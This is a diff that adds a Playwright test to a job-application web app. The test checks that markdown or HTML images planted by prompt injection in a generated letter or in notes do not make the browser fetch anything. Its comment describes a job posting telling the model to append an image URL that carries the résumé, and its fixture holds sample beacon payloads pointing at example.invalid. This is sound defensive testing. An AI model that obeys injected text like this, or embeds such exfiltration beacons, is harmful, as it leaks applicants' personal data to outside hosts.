@@ -508,6 +508,32 @@ test("a link opened in the wrong browser says which browser to use", async ({ pa
   await expectNoSeriousViolations(page);
 });
 
+test("a prompt-injected image in a draft or notes fetches nothing (#342)", async ({ page }) => {
+  // The posting told the model to end the letter with an image whose URL carries the
+  // résumé. Showing the letter must not make the browser request it — and the same goes
+  // for notes, which the poller copies from the posting.
+  const beacons = [];
+  await page.route("**://example.invalid/**", (route) => {
+    beacons.push(route.request().url());
+    return route.abort();
+  });
+  await page.route(`**/api/apps/${application.filename}`, (route) => route.fulfill({
+    status: 200, contentType: "application/json",
+    body: JSON.stringify({
+      ...detail,
+      material: "Dear Hiring Team,\n\nI build things.\n\n![](https://example.invalid/x?d=Ada)"
+        + ' <img src="https://example.invalid/raw">',
+      fields: { ...detail.fields, notes: "Notes ![logo](https://example.invalid/notes.png)" },
+    }),
+  }));
+
+  await page.getByRole("button", { name: /Example Co/ }).click();
+  await expect(page.locator(".material-body")).toContainText("I build things.");
+  await expect(page.locator(".prose-omi img")).toHaveCount(0);
+  await page.waitForLoadState("networkidle");
+  expect(beacons).toEqual([]);
+});
+
 test("the header shows the running build version", async ({ page }) => {
   // A version on screen must be one the server confirmed, so the badge stays hidden
   // until /health answers — never a guess and never an empty chip.
